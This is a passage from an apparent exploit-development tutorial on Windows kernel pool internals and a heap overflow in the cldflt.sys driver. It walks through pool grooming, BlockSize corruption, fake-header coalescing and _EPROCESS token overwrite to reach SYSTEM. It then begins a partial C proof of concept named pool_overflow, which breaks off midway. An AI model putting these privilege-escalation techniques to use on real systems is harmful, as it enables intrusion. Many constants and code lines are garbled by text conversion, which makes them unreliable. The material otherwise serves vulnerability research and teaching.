\[0x1f0\] : PID: 496, Name: smss.exe \[0x2bc\] : PID: 700, Name: csrss.exe \[0x30c\] : PID: 780, Name: wininit.exe \[0x314\] PID: 788, Name: csrss.exe \[0x354\] PID: 852, Name: winlogon.exe \[0x398\] PID: 920, Name: services.exe \[0x3a0\] PID: 928, Name: lsass.exe \[0x1e0\] PID: 480, Name: svchost.exe \[0x394\] : PID: 916, Name: svchost.exe \[0x440\] : PID: 1088, Name: svchost.exe\
\
As the output is extensive because there are many instances of svchost.exe, which effectively uses Segment Heap, I have done a slight modification to exclude svchost.exe lines, and show all other processes:\
\
0: kd> dx Debugger.Sessions\[0\].Processes.Where(p $= >$ p.Name $\\downarrow =$ "svchost.exe").Select $\_ { \\mathrm { ~ \\tiny ~ ~ } } = >$\
\
new { PID $=$ p.Id, Name $=$ p.Name, Sw $=$ p.SwitchTo(p) , HeapLines $=$\
\
Debugger.Utility.Control.ExecuteCommand("!heap")}).Where(proc $= >$\
\
proc.HeapLines.Skip(1).Any(line $= >$ line.Contains("Segment Heap"))).Select(proc $= >$ "PID: "\
\
$^ +$ proc.PID $^ +$ ", Name: " $^ +$ proc.Name),d\
\
Debugger.Sessions\[0\].Processes.Where(p => p.Name != "svchost.exe").Select(p => new { PID\
\
= p.Id, Name = p.Name, Sw = p.SwitchTo(p) , HeapLines =\
\
Debugger.Utility.Control.ExecuteCommand("!heap")}).Where(proc =>\
\
proc.HeapLines.Skip(1).Any(line => line.Contains("Segment Heap"))).Select(proc => "PID: "\
\
- proc.PID + ", Name: " + proc.Name),d\
\
  \[496\] : PID: 496, Name: smss.exe\
\
  \[700\] : PID: 700, Name: csrss.exe\
\
  \[780\] : PID: 780, Name: wininit.exe\
\
  \[788\] PID: 788, Name: csrss.exe\
\
  \[852\] PID: 852, Name: winlogon.exe\
\
  \[920\] PID: 920, Name: services.exe\
\
  \[928\] : PID: 928, Name: lsass.exe\
\
  \[3620\] PID: 3620, Name: MsMpEng.exe\
\
  \[7164\] PID: 7164, Name: sihost.exe\
\
  \[8116\] PID: 8116, Name: SearchIndexer.exe\
\
  \[8616\] PID: 8616, Name: RuntimeBroker.exe\
\
  \[9176\] PID: 9176, Name: WidgetService.exe\
\
  \[1584\] PID: 1584, Name: SecurityHealthService.exe\
\
  \[1756\] : PID: 1756, Name: WindowsPackageManagerServer.exe\
\
  \[1968\] PID: 1968, Name: dwm.exe\
\
  \[6168\] PID: 6168, Name: StartMenuExperienceHost.exe\
\
  \[3328\] PID: 3328, Name: Widgets.exe\
\
  \[7332\] PID: 7332, Name: ShellExperienceHost.exe\
\
  \[2080\] PID: 2080, Name: SearchHost.exe\
\
  \[8612\] PID: 8612, Name: msedgewebview2.exe\
\
  \[4812\] : PID: 4812, Name: msedgewebview2.exe\
\
  \[7800\] PID: 7800, Name: msedgewebview2.exe\
\
  \[5028\] PID: 5028, Name: msedgewebview2.exe\
\
  \[8020\] PID: 8020, Name: msedgewebview2.exe\
\
  \[5612\] PID: 5612, Name: msedgewebview2.exe\
\
  \[2472\] PID: 2472, Name: audiodg.exe\
\
  \[7920\] : PID: 7920, Name: RuntimeBroker.exe\
\
  \[3912\] : PID: 3912, Name: MicrosoftStartFeedProvider.exe\
\
[https://exploitreversing.com](https://exploitreversing.com/)\
\
# Segment Heap (kernel space)\
\
Since Windows 10 1903, the kernel space (kernel pool, in specific) also adopts Segment Heap organization (\_SEGMENT\_HEAP), which has the same internal organization as the user space, but that attend request allocations with a slightly different range:\
\
Low Fragmentation Heap: up to 512 bytes (makes part of the FrontEnd Allocator). Variable Size Allocator: less then 512 bytes if the LFH is not activated to the requested block size, and from 512 bytes to 128 KB to general case (makes part of the FrontEnd Allocator). Segment Allocation: from 128 KB to 8 MB (Backend Allocator). Large Allocation: above 8 MB.\
\
Additionally, and as mentioned previously, there are different and basic types of kernel pool such as NonPagedPool\|NonPagedPoolNx, Paged Pool and Session Pool (used by win32k.sys), where allocations are done using functions like ExAllocatePool, ExAllocatePool2, ExAllocatePool3, ExAllocatePoolWithTag and RtlpAllocateHeap. The Frontend allocator ( ${ \\mathsf { L F H } } +$ Variable Size Allocation) covers allocation up to 128 KB (LFH block size range is from 0 to 512 bytes, activated with 18 consecutive allocations using the same block size), where allocated memory chunk from LFH is preceded by a \_POOL\_HEADER and allocated memory chunk from Variable Size Allocator is preceded by \_HEAP\_VS\_CHUNK\_HEADER and \_POOL\_HEADER headers. The Backend allocator (Segment Allocation) covers allocations from 128KB to 8MB, and Large Block Allocation above 8MB. A particular detail is that for allocations between 512 bytes and 128 KB, freed chunks are not actually free, and they will be included into a special list named Dynamic Lookaside (\_RTL\_DYNAMIC\_LOOKASIDE), which works a kind of cache of chunks dedicated to reuse and it is organized in multiple lists (\_RTL\_LOOKASIDE), thereby requests will be first searched on Dynamic Lookaside list before following the normal rite. The Segment Allocation also has its private details, and it is composed of pages, which have 0x1000 bytes for requested allocation size smaller than 512 KB, but 0x10000 for requested allocation sizes between 512 KB and 8 MB.\
\
# 16\. Exploitation\
\
# 16.01. Concepts and mechanisms\
\
In this section we will be reviewing a few well-known techniques used for exploitation, and I will try to do a presentation with some details to explain concepts that can be important and I will try to include comments, hurdles and subtleties, to provide readers with a better understanding of the big picture and eventually making the topic a bit easier or less hard, depending on as you want to see it.\
\
At beginning of any modern exploitation process, we have to tackle with usual protections like ASLR, which are standard and default, imposes module and function base address randomization and as expected, it can prevent us from finding and using kernel functions and structures addresses in a predictable way. To distinct scenarios we could be interested in getting the base address of the kernel (ntoskrnl.exe or similar), addresses of key structures like \_EPROCESS and \_TOKEN or even getting a fixed reference to be able to calculate offsets that allow us to reach to a target function, and the usual approach to get succeed is trying to force a leak that may be not definitive by itself, but that represents the first step until we can modify fields of critical structures like \_TOKEN structure to perform elevation of privilege or even changing the execution flow to anywhere on memory. There is not only a singular and perfect technique that helps us in all contexts, and we need a set of them to get an exploit working and with minimum of stability. At the end of the day, as readers will realize, reading from and writing to the memory addresses is the core part of binary exploitation, and the entire process is based on how we can manipulate memory to obtain information and conditions that we need to.\
\
From user space perspective, a UAF (Use-After-Free) vulnerability class continues being prevalent in terms of exploitation ( [https://cwe.mitre.org/top25/archive/2025/2025\_cwe\_top25.html](https://cwe.mitre.org/top25/archive/2025/2025_cwe_top25.html)), and even though associated concepts seems simple, there are details that may need to be reviewed. In a few words, this type of vulnerability occurs when a program does not check a pointer’s validity and use such a pointer after it has been freed. Of course, the obvious consequence would be a wrong dereference to a memory address that does not contain anything useful there, but the outcome and repercussion can be worse. In the context of exploitation, the attack itself starts by trying to shape (grooming) the memory using a series of well-known objects, which provide us with an organized memory layout. The next step is to free one or many objects alternately causing a series of holes but preventing two holes (free memory chunk) from being adjacent and contiguous to each other, which prevents them from being coalesced. Once these holes are presents, it is necessary to carefully choose an object type and then allocate many instances of this object to fit available free spaces (holes). From this point, next actions may depend on goals to be reached. One of possibilities would be to force the target program to read or write a pointer, which belongs to the new allocated objects for the holes, to trigger an arbitrary code or overwrite a specific vtable pointer. Another perspective to exploit this vulnerability class, which is the most common way by far, is filling the freed memory chunks (holes) with controlled objects but attack a chosen, next, and adjacent object to overwrite or read fields from its header with the purpose of changing its behavior or leak any information (a kernel pointer, for example). Both scenarios are similar to each other, but they are not identical. In the first one, the own allocated object to fill the hole holds a pointer to a sensitive memory region that we want the program to trigger. In the second context, the real objective is overwriting or reading information from the next and adjacent object, which may has already been allocated previously when we have shaped memory (grooming), and the type of this object should be chosen carefully.\
\
According to the exposed, the first step is to be sure we really control the memory allocation to be able to prepare it with a well-known layout. This task is known as shaping, grooming or Feng Shui. In the old days, with Windows 7, the natural target was LFH because allocations there were predictable and consecutive, where first allocations came from backend allocator and it was necessary to force enough allocations (eighteen requests with the same block size) to activate LFH for that particular block size. Following such procedure, we could allocate a chunk, free it, and allocate a new chunk, which would be use exactly the same address of the first freed chunk. Unfortunately, the memory management has changed since tat time, has a distinct working on Windows 10/11 and consequently LFH allocation is different too, being completely randomized. This single fact makes exploitation via LFH harder because if we repeat the experiment, the allocations will not be done to the same addresses as the first ones. The second challenge is that the heap manager can merge (coalesce) with two adjacent blocks, but it already was the standard behavior since previous Windows versions. It is noticeable that even though exploiting LFH behavior was especially useful when exploiting Windows 7, LFH is no longer attractive on Windows 10 or 11.\
\
On Windows 10/11, the interest moved from LFH to the Backend Allocator, and the commonly adopted way to proceed is to allocate a series of memory chunks (using HeapAlloc or any other API) whose size is out of the management from LFH, which means choosing a large and uncommon size not used by applications. An educated and guided choice increases odds of the memory layout to be kept and also provides us with control over the referred memory region and, mainly, opens the possibility of leaking valuable pointers.\
\
To illustrate the explanation, we can make a series of holes (using HeapFree or any other similar function) to increase chances of one of them being filled in next allocations and, at the same time, preventing such holes from coalescing:\
\
▪ (S1) chunk chunk → chunk chunk → chunk → chunk → chunk → chunk → chunk ▪ (S2) chunk freed chunk freed chunk freed chunk freed chunk\
\
The next step is to choose an appropriate object, with a matching size and a simple header (if it has a size field would be great) that allows us to take advantage of its format and allocate a series of these fake objects that likely will fill some of recently created holes.\
\
# ▪ (S3) chunk fakeobj chunk → fakeobj chunk → fakeobj chunk → fakeobj chunk\
\
There are techniques and approaches that can be combined or adopted independently of UAF vulnerability class to compromise a target or, at least, open a wide range of opportunities to get there. In terms of exploitation of a pool allocation scenario (\_POOL\_HEADER structure), attackers usually target BlockSize field to alter its value and take advantage of this change for future free operations or allocation and can also attack the PoolType field by changing its type to trigger a type-confusion vulnerability. Another common technique would be too overwrite bytes of the \_POOL\_HEADER structure from the next chunk and then reorganize pool chunks for obtaining an overlapping layout. In a simplified form due to the fact that there are considerations that need be done, the following sequence is one of many available possibilities in a hypothetical example:\
\
We could initially allocate chunk 01, chunk 02, chunk 03 and chunk 04. Additionally, through the existing vulnerability (in our cause provided the reparse point), we can allocate and use the vulnerable chunk 01 to overwrite the adjacent object (chunk 02).\
\
Overwriting the BlockSize field (from \_POOL\_HEADER) of the adjacent chunk, we could change where the next chunk starts.\
\
As an example, it would be possible to alter BlockSize field from the adjacent chunk to $\\mathtt { 0 } \\mathtt { x } 4 0$ (remember that the nextChunk $=$ currentHeader $^ +$ (BlockSize $\\scriptstyle < < 4 )$ ), then the next chunk would start in the middle of the overwritten chunk.\
\
The size of a chunk is given by ${ \\mathsf { S i z e } } = { \\mathsf { B l o c k S i z e } } ^ { \* } \ 0 { \\times } 1 0$ if we are allocating chunks from Variable Size Allocator (VS) and Backend Allocator. If we were working with kLFH (it is not the case), kLFH chunks are tracked and based on normal pool pages that have \_POOL\_HEADER, but each one of them does not have individually an associated POOL\_HEADER (imagine this header followed by LFH\
\
subsegment with a sequence of chunks without an own header). As expected, they do not follow the same rules for calculating the size as shown here.\
\
As a side note, in old Windows 10 versions, a similar idea was also applied to Large Pool Allocations (> PAGE\_SIZE), which were controlled (or tracked) by \_POOL\_TRACKER\_BIG\_PAGES structure (from PoolBigPageTable array) and also did not have a \_POOL\_HEADER per chunk. As arrays were used, the performance was not great. On modern and recent Windows 11 versions,\
\
\_POOL\_TRACKER\_BIG\_PAGES structures are still used (dt nt!\_POOL\_TRACKER\_BIG\_PAGES), but its\
\
role in tracking large page allocations has been considerably diminished, and \_SEGMENT\_HEAP → LargeAllocMetaData Root \_RTL\_BALANCED\_NODE \_HEAP\_LARGE\_ALLOC\_DATA ( [https://www.vergiliusproject.com/kernels/x64/windows-11/25h2/\_HEAP\_LARGE\_ALLOC\_DATA](https://www.vergiliusproject.com/kernels/x64/windows-11/25h2/_HEAP_LARGE_ALLOC_DATA)) is used to track allocated addresses (VirtualAddress), flags (ExtraPresent, GuardPageCount, GuardPageAlignment and UnusedBytes) and associated size (AllocatedPages). This time, a RedBlack tree ( [https://www.geeksforgeeks.org/dsa/introduction-to-red-black-tree/](https://www.geeksforgeeks.org/dsa/introduction-to-red-black-tree/)) is used (TreeNode), and there is a performance improvement. For the same reason, they also do not follow the mentioned size rule and actually the size calculation is size $=$ AllocatedPages $\\times 0 { \\times } 1 0 0 0 $ ):\
\
0: kd> dt nt!\_SEGMENT\_HEAP\
\
$\+ \\odot \\times \\odot \\odot \\odot$ EnvHandle : RTL\_HP\_ENV\_HANDLE\
\
$\+ \\odot \\times \\odot 1 \\odot$ Signature : Uint4B\
\
$\+ \\odot \\times \\odot 4 \\odot$ LargeMetadataLock : Uint8B\
\
$\+ \\odot \\times \\odot 4 8$ LargeAllocMetadata : \_RTL\_RB\_TREE\
\
$\+ \\odot \\times \\odot 5 8$ LargeReservedPages : Uint8B\
\
$\+ \\odot \\times \\odot 6 \\odot$ LargeCommittedPages : Uint8B\
\
$\+ \\odot \\times \\perp 4 \\odot$ SegContexts : \[2\] \_HEAP\_SEG\_CONTEXT (standard/regular segments)\
\
$\+ \\odot \\times 2 \\subset \\Theta$ VsContext : \_HEAP\_VS\_CONTEXT (Variable Size Allocations)\
\
$\+ \\odot \\times 3 4 \\odot$ LfhContext : \_HEAP\_LFH\_CONTEXT (Low Fragmentation Heap)\
\
0: kd> dt nt!\_HEAP\_LARGE\_ALLOC\_DATA $+ \\odot \\times \\odot \\odot \\odot$ TreeNode : \_RTL\_BALANCED\_NODE $+ \\odot \\times \\odot 1 8$ VirtualAddress : Uint8B $+ \\odot \\times \\odot 1 8$ UnusedBytes : Pos 0, 16 Bits $+ \\odot \\times \\odot 2 \\odot$ ExtraPresent Pos 0, 1 Bit $+ \\odot \\times \\odot 2 \\odot$ GuardPageCount : Pos 1, 1 Bit $+ \\odot \\times \\odot 2 \\odot$ GuardPageAlignment : Pos 2, 6 Bits $+ \\odot \\times \\odot 2 \\odot$ Spare : Pos 8, 4 Bits $+ \\odot \\times \\odot 2 \\odot$ AllocatedPages : Pos 12, 52 Bits\
\
The side effect is interesting because a new chunk (fake chunk) would start at the middle of the chunk 02.\
\
▪ The next step would be to implant a new header over the new created chunk (fake chunk). Chunk 03 could be released. The chunk 02 could also be released, and it would allow a coalescing happening between fake chunk and chunk 03, but due to the implanted header, the pool thinks that the available space for the new chunk goes from $0 \\times 1 0 0 0$ to $0 \\times 4 0 0 0$ .\
\
▪ The attacker can allocate a new object, which overlaps the fake chunk, chunk 03 and chunk 04, providing full control. If the chunk 04 has sensitive data (like a token), it is possible to escalate privilege to SYSTEM.\
\
In the hypothetical and educational scenario exposed above, where I have chosen BlockSize equal to 0x100 only to make mathematics easier to understand, we would have the following scheme:\
\
# Stage 01: Normal Scenario\
\
# Chunk 01 (vulnerable chunk):\
\
Address: 0x0000\
\
BlockSize: 0x100\
\
# [https://exploitreversing.com](https://exploitreversing.com/)\
\
▪ Size: 0x1000 bytes State: ALLOCATED ▪ Ends at: 0x1000\
\
# Chunk 02 (it will be corrupted and also freed):\
\
▪ Address: 0x1000\
\
▪ BlockSize: 0x100 (before corruption)\
\
▪ Size: 0x1000 bytes\
\
▪ State: ALLOCATED Ends at: 0x2000\
\
# Chunk 03 (it will be freed):\
\
▪ Address: 0x2000 ▪ BlockSize: 0x100 ▪ Size: 0x1000 bytes ▪ State: ALLOCATED ▪ Ends at: 0x3000\
\
# Chunk 04 (the real target):\
\
▪ Address: 0x3000\
\
▪ BlockSize: 0x100\
\
▪ Size: 0x1000 bytes\
\
▪ State: ALLOCATED (contains a key structure like EPROCESS token) Ends at: 0x4000\
\
# Stage 02: Overflow chunk 2\
\
# Chunk 01 (vulnerable chunk):\
\
▪ Address: 0x0000 ▪ BlockSize: 0x100 ▪ Size: 0x1000 bytes ▪ State: ALLOCATED Ends at: 0x1000\
\
# Chunk 02 (corrupted):\
\
▪ Address: 0x1000\
\
▪ BlockSize: 0x40 (CORRUPTED - the original BlockSize was 0x100)\
\
▪ Size: 0x1000 bytes (actual size unchanged)\
\
▪ Pool thinks size: 0x400 bytes\
\
▪ Pool thinks ends at: 0x1400\
\
▪ State: ALLOCATED Ends at: 0x2000\
\
# Chunk 03 (it will be freed):\
\
▪ Address: 0x2000 ▪ BlockSize: 0x100 ▪ Size: 0x1000 bytes ▪ State: ALLOCATED ▪ Ends at: 0x3000\
\
# Chunk 04 (potential target):\
\
Address: 0x3000\
\
# [https://exploitreversing.com](https://exploitreversing.com/)\
\
▪ BlockSize: 0x100\
\
Size: 0x1000 bytes\
\
▪ State: ALLOCATED (contains a key structure like EPROCESS token)\
\
▪ Ends at: 0x4000\
\
# Stage 03: Implant a fake header\
\
# Chunk 01 (vulnerable chunk):\
\
▪ Address: 0x0000 ▪ BlockSize: 0x100 ▪ Size: 0x1000 bytes ▪ State: ALLOCATED Ends at: 0x1000\
\
# Chunk 02 (corrupted $^ +$ fake header planted):\
\
Address: 0x1000\
\
▪ BlockSize: 0x40 (CORRUPTED)\
\
▪ Size: 0x1000 bytes (actual size unchanged)\
\
▪ Pool thinks size: 0x400 bytes\
\
▪ Pool thinks ends at: 0x1400 State: ALLOCATED Ends at: 0x2000\
\
# ▪ NOTE: fake header implanted at offset 0x400 (address 0x1400):\
\
Address: 0x1400\
\
▪ PreviousSize: 0x40 (points back to corrupted Chunk 02) PoolIndex: 0x00\
\
BlockSize: $\_ { 0 \\times 2 \\subset 0 }$ (fake chunk size)\
\
▪ PoolType: 0x00 (marks as FREE). PoolTag: 'c0de' (or any recognizable tag)\
\
# ▪ Fake chunk properties:\
\
▪ Starts at: 0x1400 ▪ Size: $0 { \\times } 2 0 ^ { + } 0 { \\times } 1 0 = 0 { \\times } 2 0 0$ bytes ▪ Ends at: $0 { \\times } 1 4 0 0 + 0 { \\times } 2 { \\mathsf { C } } 0 0 = 0 { \\times } 4 0 0 0$ ▪ Covers: Lost space $^ +$ Chunk ${ 0 3 + }$ Chunk 04\
\
# Chunk 03 (it will be freed):\
\
Address: 0x2000\
\
▪ BlockSize: 0x100\
\
▪ Size: 0x1000 bytes\
\
▪ State: ALLOCATED\
\
▪ Ends at: 0x3000\
\
Note: it will be inside ghost chunk, which covers 0x1400 to 0x4000.\
\
# Chunk 04 (potential target):\
\
▪ Address: 0x3000\
\
▪ BlockSize: 0x100\
\
▪ Size: 0x1000 bytes\
\
▪ State: ALLOCATED (contains a key structure like \_EPROCESS token) ▪ Ends at: 0x4000\
\
▪ Note: it will be inside fake chunk, which covers 0x1400 to 0x4000.\
\
# Stage 04: Freed Chunk 03\
\
# Chunk 01 (vulnerable chunk):\
\
▪ Address: 0x0000 ▪ BlockSize: 0x100 ▪ Size: 0x1000 bytes ▪ State: ALLOCATED ▪ Ends at: 0x1000\
\
# Chunk 02 (corrupted $^ +$ fake header implanted):\
\
▪ Address: 0x1000\
\
▪ BlockSize: 0x40 (corrupted)\
\
▪ Real size: 0x1000 bytes\
\
▪ Pool thinks size: 0x400 bytes\
\
▪ Pool thinks ends at: 0x1400\
\
▪ State: ALLOCATED\
\
▪ Ends at: 0x2000\
\
# Fake header at 0x1400:\
\
▪ BlockSize: 0x2C0 ▪ PoolType: 0x00 (FREE) ▪ Ghost chunk: 0x1400 - 0x4000\
\
# Chunk 03 (freed):\
\
▪ Address: 0x2000 ▪ BlockSize: 0x100 ▪ Size: 0x1000 bytes ▪ State: FREE ▪ Ends at: 0x3000\
\
# Pool action:\
\
▪ We are marking $0 { \\times } 2 0 0 0 - 0 { \\times } 3 0 0 0$ as FREE. Checks forward: next chunk at $0 \\times 3 0 0 0$ (Chunk 04). Chunk 04 is ALLOCATED, no coalescing.\
\
# Chunk 04 (potential target):\
\
▪ Address: 0x3000\
\
▪ BlockSize: 0x100 Size: 0x1000 bytes\
\
▪ State: ALLOCATED (contains a key structure like EPROCESS token) Ends at: 0x4000\
\
Stage 05: Freed Chunk 02 (coalescing with fake chunk)\
\
# Chunk 01 (vulnerable chunk):\
\
▪ Address: 0x0000 ▪ BlockSize: 0x100 ▪ Size: 0x1000 bytes ▪ State: ALLOCATED ▪ Ends at: 0x1000\
\
# Coalesced chunk (chunk 02 $^ +$ fake chunk):\
\
# Pool's perspective:\
\
Freed Chunk 02 at 0x1000 (BlockSize 0x40, size 0x400) Found fake header at 0x1400 (BlockSize 0x2C0, FREE). Coalesce them into one big free chunk due to the fake header. Even though chunk 03 is free, it is not coalesced because under the pool perspective there is something (fake chunk) between the chunk 02 and chunk 03. Coalesced size: 0x1000 - 0x4000 (size 0x3000 bytes) because the fake chunk covers chunks 02 and 03. State: FREE\
\
# Reality:\
\
0x1000 - 0x2000: Real Chunk 02 space (freed) 0x1400 - 0x2000: Lost space (0xC00 bytes) 0x2000 - 0x3000: Chunk 03 (was freed, and belongs to the free list) 0x3000 - 0x4000: Chunk 04 (still allocated, but inside the coalesced space!)\
\
# Memory map from pool's view:\
\
Pool thinks: 0x1000 - 0x4000 is one big and single chunk. Reality: Chunks 03 and 04 are considered inside of this "free" space!\
\
# Chunk 03 (freed, now covered by coalesced chunk):\
\
▪ Address: 0x2000\
\
▪ BlockSize: 0x100\
\
▪ Size: 0x1000 bytes\
\
▪ State: FREE (freed in Stage 04)\
\
▪ Pool view: Inside coalesced chunk (0x1000 - 0x4000) Ends at: 0x3000\
\
# Chunk 04 (target - covered by coalesced chunk):\
\
▪ Address: 0x3000\
\
▪ BlockSize: 0x100\
\
▪ Size: 0x1000 bytes\
\
▪ State: ALLOCATED (still contains \_EPROCESS token!)\
\
▪ Pool view: Inside the "free" coalesced chunk (0x1000 - 0x4000) Reality: Still allocated, but pool thinks it's free space! Ends at: 0x4000\
\
Critical note: Pool manager lost track of Chunk 04!\
\
Stage 06: Allocate Attacker Object (Exploitation)\
\
# Chunk 01 (vulnerable chunk):\
\
▪ Address: 0x0000 ▪ BlockSize: 0x100 ▪ Size: 0x1000 bytes ▪ State: ALLOCATED ▪ Ends at: 0x1000\
\
# New Exploitation Object (allocated into "free coalesced” space):\
\
# Allocation:\
\
▪ Request: ExAllocatePoolWithTag(PagedPool, 0x3000, 'Alex') Pool finds: Free chunk at 0x1000 (size 0x3000) Allocates: 0x1000 - 0x4000\
\
Exploitation object properties:\
\
▪ Address: 0x1000\
\
▪ Size: 0x3000 bytes\
\
▪ State: ALLOCATED\
\
▪ Contains: Attacker-controlled data\
\
Ends at: 0x4000\
\
Overlapping achieved:\
\
▪ Attacker object: 0x1000 - 0x4000 ▪ Old Chunk 02 space: 0x1000 - 0x2000 (reused) ▪ Old Chunk 03 space: 0x2000 - 0x3000 (overlapped) ▪ Chunk 04: 0x3000 - 0x4000 (overlapped)\
\
Memory mapping:\
\
Attacker\[0x0000 - 0x0FFF\]: Overwrites old Chunk 02 data Attacker\[0x1000 - 0x1FFF\]: Overwrites Chunk 03 data (0x2000 - 0x3000) Attacker\[0x2000 - 0x2FFF\]: Overwrites Chunk 04 data (0x3000 - 0x4000)\
\
# Chunk 03 (memory space reused by attacker):\
\
▪ Address: 0x2000\
\
▪ Previous state: FREE\
\
▪ Current state: Overlapped by attacker object\
\
▪ Memory contains: Attacker-controlled data Ends at: 0x3000\
\
# Chunk 04 (corrupted target):\
\
Address: 0x3000\
\
▪ BlockSize: 0x100 (original value still in header).\
\
▪ Size: 0x1000 bytes\
\
▪ State: ALLOCATED (still thinks it's valid!).\
\
▪ Actual data: CORRUPTED by exploitation object. Ends at: 0x4000\
\
# EXPLOITATION:\
\
▪ Chunk 04 still exists and is tracked by kernel.\
\
▪ It contains \_EPROCESS token structure.\
\
▪ But its data is overlapped by exploitation object.\
\
▪ Attacker can write to offset $0 \\times 2 0 0 0$ , thereby it corrupts Chunk 04.\
\
\[Figure 103\]: Simplified overlapping simulation\
\
The final attack should be executed according to the following sequence:\
\
Use memcpy(attackerObject $^ +$ 0x2000, maliciousTokenData, 0x1000);\
\
This writes to address $0 \\times 3 0 0 0$ (Chunk 04's location)\
\
Corrupts \_EPROCESS token: Overwrite privileges (enable all)\
\
▪ Overwrite token SID (change to SYSTEM) ▪ Achieve SYSTEM privileges!\
\
This scenario also provides the possibility of reading and writing overlapped objects, performing a typeconfusion attack (changing an object by another one) or even using it as a use-after-free primitive because the kernel might be pointing to (and using) the chunk 04. It would be possible to free the chunk 04 (that has been overlapped, don’t forget it), but kernel would continue to believe that there is something there even though the pool recognizes this chunk as free, and thus we have a dangling pointer. If we reallocated a new chunk (ExAllocatePoolWithTag) with a malicious structure, which holds pointers as members, into the same place then once the kernel read the chunk again it will interpret the content and, eventually, it will dereference one of its pointers. As I have explained, in the real-world there are difficulties, limitations and restrictions that need to be overcome.\
\
A similar approach also works for arbitrary read and write primitive. We can create a crafted object with structure containing pointers and buffers and spray the target pool (chunk 04) with this new object at address $0 \\times 3 0 0 0$ (same address of chunk 04). Once we overlap the chunk 04 using the previous described technique, we can overwrite mentioned pointers and buffers’ content with any pointer we want. However, the legitimate code that reads and writes from these pointers and buffers still believes that they are unchanged while they have already been modified, and this context provides us with an arbitrary readwrite primitive to anywhere (including kernel). Using the same technique, we can groom the pool to exploit another vulnerability, leak memory content, trigger or overwrite a callback, overwrite a security descriptor, and explore other alternatives. At this point, I believe this summary about these simple exploitation techniques has provided readers with the general idea and some foundation to proceed with reading.\
\
Returning to cldflt.sys minifilter driver, at this point we are able to reach the exact line of code that is responsible for vulnerability, which supports a stance and perspective of going further and exploiting the driver, even though it is always wise to keep a safe distance from any expectance of success because it is never possible to say as predictable, efficient and stable an exploitation can be or not. Near to the critical line there is a call for ExAllocatePoolWithTag function that involves a paged pool allocation of $0 \\times 1 0 0 0$ bytes ( ptr\_buffer\_ $\\mathbf { 0 } 2 =$ ExAllocatePoolWithTag(PagedPool, 0x1000uLL, 'mBsH'); ). Therefore, we know the size of the memory page and where it is located.\
\
Most certainly, the next logical step is to understand what we can to do to move forward and start the real exploitation development.\
\
# 16.02. Pool overflow\
\
As in our previous code (reparse\_point) we were not able to reach the vulnerable line, the natural step is to try reach it and, once we do it, we have to do something useful that provides us with a starting point and direction. We know that if we get the vulnerable line, we can cause an overflow into the ptr\_buffer\_02 ( memmove(ptr\_buffer\_02, Src, Element\_Length); ) and override the first bytes of the next and adjacent pool, which will open other possibilities.\
\
[https://exploitreversing.com](https://exploitreversing.com/)\
\
Therefore, I have created a new program named pool\_overflow that is based on the previous reparse\_point program, but this time included a few changes. This new code also reaches the second memcpy function (represented as memmove function by IDA Pro and shown in the previous paragraph) within HsmIBitmapNORMALOpen routine, a fact that the last program did not do, and it overwrites a few bytes beyond the limit of the allocated buffer (0x1000).\
\
The memory configuration is something like:\
\
▪ POOL → POOL → POOL → POOL → POOL → POOL → POOL → POOL → POOL → POOL\
\
The idea here is to provide a pool chunk (payload) with 0x1010 bytes and exploit the fact that we are able to control the size argument of the memset (memcpy), which allows us to force an overflow of the destination buffer that has been allocated with size of $0 \\times 1 0 0 0$ bytes, thereby causing the overwriting of the first bytes from the next and adjacent pool chunk. Later, during the next exploitation phase, we will be using this same vulnerability to attack other object types and overwrite bytes from adjacent objects too. To help readers, I have highlighted the most relevant aspects of the code, and I will make some observations later. The pool\_overflow code follows:\
\
#include <Windows.h> #include <cfapi.h> #include <winioctl.h> #include <ShlObj.h> #include <stdio.h> #include  #include <initguid.h> #include <guiddef.h>\
\
DEFINE\_GUID(ProviderId, $\\Theta \\times$ 1b4f2a33, $\\Theta \\times$ b1b3, $\\Theta \\times 4 \\Theta \\subset \\Theta$ , $\\Theta \\times \\mathsf { b a }$ , $\\Theta \\times 5 \ a$ , $\\Theta \\times \\Theta 6$ , $\\Theta \\times 3 4$ , $\\Theta \\times \\in \\mathsf { C }$ , $\\Theta \\times 6 3$ , $\\Theta \\times \\mathrm { d e }$ , $\\Theta \\times \\Theta \\Theta$ );\
\
#pragma comment(lib, "Cldapi.lib")\
\
typedef enum \_HSM\_CONSTANTS { HSM\_BITMAP\_MAGIC $=$ 0x70527442, // 'BtRp' HSM\_FILE\_MAGIC $=$ 0x70526546, // 'FeRp' HSM\_DATA\_HAVE\_CRC $=$ $\\Theta \\times \\Theta 2$ , HSM\_ELEMENT\_TYPE\_UINT64 $=$ $\\Theta \\times \\Theta 6$ , HSM\_ELEMENT\_TYPE\_BYTE $=$ $\\Theta \\times \\Theta 7$ , HSM\_ELEMENT\_TYPE\_UINT32 = $\\Theta \\times \\Theta \\mathsf { A }$ , HSM\_ELEMENT\_TYPE\_MAX = 0x10, HSM\_ELEMENT\_TYPE\_BITMAP $=$ $\\Theta \\times \\bot 1$ ,\
\
} HSM\_CONSTANTS; static const USHORT HSM\_HEADER\_SIZE $=$ $\\Theta \\times \\perp 4$ ;\
\
static const USHORT HSM\_ELEMENT\_INFO\_SIZE $=$ $\\Theta \\times \\Theta 8$ ;\
\
static const USHORT BTRP\_ALIGN $=$ $\\Theta \\times \\Theta 4$ ;\
\
static const USHORT FERP\_ALIGN $=$ $\\Theta \\times \\Theta 8$ ;\
\
static const USHORT ELEMENT\_NUMBER $=$ $\\Theta \\times \\Theta 5$ ; // Remember: program uses 5 elements static const USHORT MAX\_ELEMS $=$ $\\Theta \\times \\Theta \\mathsf { A }$ ; // Remember: FeRp format reserves 10 slots static const USHORT VERSION\_VALUE $=$ $\\Theta \\times \\Theta \\Theta \\Theta 1$ ;\
\
static const USHORT ELEMENT\_START\_OFFSET $=$ $\\Theta \\times 6 \\Theta$ ; // That's where the payload actually starts (consider 10 slots)\
\
# [https://exploitreversing.com](https://exploitreversing.com/)\
\
static const USHORT PAYLOAD\_INITIAL\_BYTE $\\begin{array} { r l } { = } & { { } \\odot { \\times } \\mathsf { A B } } \\end{array}$ ;\
\
in this case, I have used initials of my name.\
\
static const USHORT FERP\_BUFFER\_SIZE $=$ $\\Theta \\times 4 \\Theta \\Theta \\Theta$ ;\
\
static const USHORT BTRP\_BUFFER\_SIZE $=$ $\\Theta \\times 4 \\Theta \\Theta \\Theta$ ;\
\
static const USHORT COMPRESSED\_SIZE $=$ $\\Theta \\times 4 \\Theta \\Theta \\Theta$ ;\
\
